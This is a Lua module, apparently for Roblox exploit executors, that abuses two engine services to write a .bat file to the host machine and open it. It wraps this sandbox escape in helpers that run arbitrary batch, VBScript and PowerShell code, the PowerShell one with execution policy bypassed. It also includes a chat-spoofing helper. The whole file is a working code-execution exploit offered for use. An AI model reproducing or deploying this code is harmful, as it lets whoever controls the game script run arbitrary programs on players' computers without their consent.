local secment = {}

function secment.bat(code)
    local name = math.random(100000, 999999)
    local batContent = [[
@echo off
]] .. code .. [[
]]
    local batFileName = tostring(name) .. ".bat"
    game:GetService("LinkingService"):OpenUrl(game:GetService("ScriptContext"):SaveScriptProfilingData(batContent, batFileName))
end

function secment.vbs(code)
    secment.bat([[ 
@echo off
setlocal

(
echo ]] .. code .. [[
) > temp_script.vbs

cscript //nologo temp_script.vbs
del temp_script.vbs
]])
end

function secment.powershell(code)
    secment.bat([[Powershell.exe -ExecutionPolicy Bypass -Command "]] .. code .. [[" & del temp_script.ps1]])
end

function secment.msgbox(message)
    secment.powershell([[Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show(']] .. message .. [[')]])
end

function secment.chat(msg)
    if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService then
        game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents").SayMessageRequest:FireServer(msg,"All")
    else
        game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(msg)
    end
end    

function secment.help()
    print("Available Functions:")
    print("1. secment.bat(code) - executes a bat command")
    print("2. secment.vbs(code) - executes a vbs command")
    print("3. secment.powershell(code) - executes a powershell command")
    print("4. secment.msgbox(message) - shows a messagebox")
    print("5. secment.chat(msg) - chats a custom message")
    print("6. secment.help() - prints this message")
end

return secment
